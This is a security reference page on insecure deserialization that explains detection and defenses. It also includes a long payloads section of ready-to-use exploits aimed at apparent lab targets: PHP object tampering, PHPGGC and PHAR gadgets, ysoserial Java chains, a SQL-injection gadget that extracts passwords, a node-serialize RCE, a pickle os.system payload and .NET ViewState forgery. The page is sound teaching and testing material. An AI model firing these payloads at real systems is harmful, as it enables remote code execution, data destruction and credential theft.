# Insecure Deserialization

> Deserializing attacker data instantiates dangerous objects, often RCE. **Deep dive:** [`Troubleshooting_Guide/se_de.md`](../../../../Troubleshooting_Guide/se_de.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A08:2021 Software & Data Integrity Failures
**Status:** complete

## What it is
Insecure deserialization is when an application reconstructs objects from attacker-controllable
serialized data without validating it. Because deserialization can instantiate arbitrary types and
trigger their lifecycle methods, controlling the byte stream can let an attacker manipulate application
logic or run code.

## How it works
The app accepts a serialized blob — typically a session cookie, hidden form field, or message — and
passes it straight to `unserialize()`, `ObjectInputStream.readObject()`, `pickle.loads()`, Ruby
`Marshal.load`, or `.NET` ViewState parsing. The attacker controls the object's class and field values.
Tampering flips attributes (e.g. `admin` flag) or abuses type juggling; the deeper exploit chains
existing classes ("gadgets") whose `__destruct`/`readObject`/`__reduce__` methods perform dangerous
operations, so simply deserializing the payload executes attacker logic.

## Impact
At minimum, privilege escalation and logic bypass via tampered attributes; at worst, full remote code
execution through gadget chains (ysoserial, PHPGGC, ysoserial.net). It can also yield arbitrary file
read/write/delete, SQL injection, and SSRF depending on available gadgets. RCE-capable cases are
critical.

## How to detect
- Identify serialized data by its signature: PHP `O:`/`a:`, Java `AC ED 00 05` / Base64 `rO0AB`, Python
  pickle `\x80`, Ruby Marshal `\x04\x08`, or a `__VIEWSTATE` field.
- Tamper minimally (flip a byte, change a length prefix) and watch for deserialization exceptions or
  changed behavior.
- For blind cases, use a safe out-of-band probe (Java `URLDNS`, a PHP `sleep`/file-write gadget) and
  confirm via DNS callback or timing rather than firing RCE blindly.

## Exploitation (summary)
Once the format is known, edit attributes for logic bypass, or generate a gadget-chain payload with the
appropriate tool and submit it in place of the legitimate blob. Signed/encrypted formats (Symfony
cookies, .NET ViewState) require a leaked secret/machine key, which is often recoverable via information
disclosure. Per-language payloads and the cookie encode/decode workflow are in the Payloads section.

## Payloads & techniques

> Distilled from field payload references — for authorized testing only.

### Format detection

| Format | Magic bytes / pattern | Where it surfaces |
|--------|----------------------|-------------------|
| PHP | `O:`, `a:`, `s:`, `i:`, `b:` in serialized string | `PHPSESSID` / session cookie |
| Java | `AC ED 00 05` (raw), `rO0AB` (Base64) | `JSESSIONID` / session cookie |
| Ruby Marshal | `\x04\x08` | `_session_id` |
| Python Pickle | `\x80\x02`, `\x80\x04`, `\x80\x05` | session cookie |
| .NET ViewState | `__VIEWSTATE` form parameter | hidden form field |

### PHP object tampering

Flip an admin flag in a Base64/URL-decoded session object:
```text
# Original
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
# Modified (b:0 → b:1)
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```
Workflow in Burp: decode cookie (URL → Base64), edit, re-encode (Base64 → URL), then hit `/admin`.

Type juggling against a loose `== 0` comparison — swap the token to integer `0` (`"anything" == 0` is `TRUE` in PHP); remember to fix the string-length prefix:
```text
# username length 6 → 13, token type s → i, value → 0
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

Arbitrary file deletion via an `avatar_link` attribute pointed at a victim file, then `POST /my-account/delete`:
```text
O:4:"User":3:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

### PHP magic-method / gadget injection

Inject an object whose `__destruct`/`__wakeup` performs the dangerous action:
```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
```bash
php -r 'echo base64_encode("O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";}");'
```

Symfony signed cookie with a **leaked secret key** (PHPGGC + HMAC). Leak the key from a debug page, build the gadget, then sign it without needing PHP:
```bash
curl https://TARGET/cgi-bin/phpinfo.php | grep SECRET_KEY
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
```python
import hmac, hashlib, urllib.parse

secret_key = "LEAKED_KEY_HERE"
object_payload = "BASE64_PHPGGC_OUTPUT_HERE"

sig = hmac.new(secret_key.encode(), object_payload.encode(), hashlib.sha1).hexdigest()
cookie = urllib.parse.quote(f'{{"token":"{object_payload}","sig_hmac_sha1":"{sig}"}}')
print(cookie)
# curl -b "session=$cookie" https://TARGET/my-account
```

PHAR deserialization — any file op on a `phar://` path deserializes embedded metadata:
```bash
./phpggc Monolog/RCE1 system 'whoami' -p phar -o evil.jpg
# Trigger: GET /avatar.php?avatar=phar:///uploads/evil.jpg
# Needs phar.readonly = Off; sinks: file_exists, fopen, stat, file_get_contents, SplFileInfo
```

### Java gadget chains

Apache Commons Collections RCE via ysoserial (note the `--add-opens` flags for Java 16+):
```bash
# Java 16+
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0

# Java 15 and below
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```
```python
import subprocess, base64, requests, urllib.parse

ysoserial_cmd = ['java', '-jar', 'ysoserial-all.jar',
                 'CommonsCollections4', 'rm /home/carlos/morale.txt']
payload_bytes = subprocess.run(ysoserial_cmd, capture_output=True).stdout
encoded = urllib.parse.quote(base64.b64encode(payload_bytes).decode())
requests.get('https://TARGET/my-account', cookies={'session': encoded})
```

Custom gadget chain — re-serialize an app class (e.g. `ProductTemplate`) with a SQL-injection string to reach a deserialization-time query sink:
```java
import java.io.*;
import java.util.Base64;

class ProductTemplate implements Serializable {
    private final String id;
    public ProductTemplate(String id) { this.id = id; }
}

public class GeneratePayload {
    public static void main(String[] args) throws Exception {
        String[] payloads = {
            "'",
            "' ORDER BY 8--",
            "' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--"
        };
        for (String payload : payloads) {
            ProductTemplate obj = new ProductTemplate(payload);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            oos.close();
            System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        }
    }
}
```
```bash
javac GeneratePayload.java && java GeneratePayload   # send Base64 output as session cookie
```

### Node.js `node-serialize` RCE

Immediately-invoked function expression in the `_$$ND_FUNC$$_` marker fires on `deserialize()`:
```javascript
const payload = {
  rce: "_$$ND_FUNC$$_function(){require('child_process').exec('rm /home/carlos/morale.txt')}()",
};
const encoded = Buffer.from(JSON.stringify(payload)).toString("base64");
// Set as session cookie
```

### Python Pickle RCE

`__reduce__` returns a callable + args executed on `pickle.loads()`:
```python
import pickle, os, base64

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('rm /home/carlos/morale.txt',))

payload = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()
print(f"Cookie: {payload}")

# Safe canary instead of os.system:
class SafeCanary:
    def __reduce__(self):
        return (print, ('DESERIALIZATION_EXECUTED',))
```

### .NET ViewState (ysoserial.net)

With a leaked MachineKey, forge a malicious `__VIEWSTATE`:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c 'powershell whoami > C:\inetpub\wwwroot\out.txt' \
  --path=/default.aspx --apppath=/ \
  --decryptionalg=AES --decryptionkey=LEAKED_KEY \
  --validationalg=SHA1 --validationkey=LEAKED_KEY
```

### Blind detection (no RCE)

Java URLDNS — DNS callback confirms deserialization safely:
```bash
java -jar ysoserial-all.jar URLDNS 'http://YOUR.burpcollaborator.net' | base64 -w 0
```
PHP time-based / error-based probes via PHPGGC:
```bash
./phpggc Symfony/RCE3 sleep 5 -b | base64
./phpggc -b '<?php file_put_contents("/tmp/pwned","pwned"); ?>' > pwned.phar
```

### Cookie encoding workflow

```text
PHP  serialize:   object → serialize() → base64 → URL-encode → cookie
PHP  deserialize: cookie → URL-decode → base64-decode → unserialize()
Java serialize:   object → java serialization → base64 → URL-encode → cookie
Java deserialize: cookie → URL-decode → base64-decode → ObjectInputStream.readObject()
```

## Defenses
1. **Don't deserialize untrusted data** — the only robust fix. Use a flat data format (JSON/XML with a
   schema) for cross-trust-boundary data and map fields explicitly.
2. **If native serialization is unavoidable**, enforce integrity: sign serialized data with a server-only
   key (HMAC) and verify before deserializing, so tampered blobs are rejected.
3. **Restrict types** — use look-ahead/allow-list deserialization (Java `ObjectInputFilter`, .NET
   `SerializationBinder`) so only expected classes can be instantiated; never deserialize to arbitrary types.
4. **Remove gadget surface** — keep dependencies patched and drop libraries with known gadget chains
   (Commons Collections, etc.); set `phar.readonly = On` in PHP.
5. Protect signing/machine keys and run with least privilege so a successful chain has limited blast radius.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Insecure+Deserialization
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Insecure+Deserialization
- **Exploit-DB** — https://www.exploit-db.com/search?q=Insecure+Deserialization
- **GitHub Advisories** — https://github.com/advisories?query=Insecure+Deserialization
- **OSV** — https://osv.dev/list?q=Insecure+Deserialization
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Insecure Deserialization <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2015-7501` / `CVE-2015-4852` — Apache Commons Collections gadget chain; pervasive Java
  deserialization RCE across JBoss, WebLogic, WebSphere, Jenkins (the ysoserial era).
- `CVE-2017-9805` — Apache Struts 2 REST plugin XStream deserialization RCE.
- `CVE-2020-2555` — Oracle Coherence/WebLogic T3 deserialization RCE (recurrent WebLogic gadget class).

## References
- PortSwigger Web Security Academy — Insecure deserialization.
- OWASP — Deserialization Cheat Sheet.
- OWASP Top 10 — A08:2021 Software and Data Integrity Failures.
